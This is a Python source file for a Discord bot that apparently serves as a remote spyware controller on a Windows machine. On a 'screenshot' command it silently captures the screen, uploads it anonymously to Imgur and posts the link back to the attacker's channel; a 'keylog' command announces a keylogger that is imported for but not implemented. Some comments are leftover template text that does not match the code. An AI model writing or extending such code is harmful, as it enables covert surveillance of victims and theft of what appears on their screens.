import discord
from discord.ext import commands
import pyautogui
import tempfile
from imgurpython import ImgurClient
from pynput.keyboard import Key, Listener
import os
import logging
import win32api
import win32console
import win32gui
import pythoncom, pyhooks


# Define intents (all default intents are enabled)
intents = discord.Intents.default()

# Create a bot instance with the defined intents
bot = commands.Bot(command_prefix='!', intents=intents)



# Replace with your own Imgur client ID and secret
client_id = 'Client ID Goes Here'
client_secret = 'Secret Key'

# Define the on_message event
@bot.event
async def on_message(message):
    # Ignore messages sent by the bot itself
    if message.author == bot.user:
        return

    # Define a condition: If the message content is "hello"
    if message.content.lower() == 'keylog':
        await message.channel.send('Keylogger Activated!')

    # Another condition: If the message content contains "question"
    if 'screenshot' in message.content.lower():
        # Create an Imgur client instance
        client = ImgurClient(client_id, client_secret)

        # Take a screenshot
        screenshot = pyautogui.screenshot()

        # Save the screenshot to a temporary file
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
            screenshot.save(temp_file.name)

            # Upload the image to Imgur
            uploaded_image = client.upload_from_path(temp_file.name, config=None, anon=True)

            # Get the link to the uploaded image
            image_link = uploaded_image['link']

            print(f"Image uploaded to: {image_link}")
        await message.channel.send(image_link)

    # This line is required to process commands, if you're using the commands extension

# Replace 'your_token_here' with your bot's token
bot.run('Your Discord Api Key')
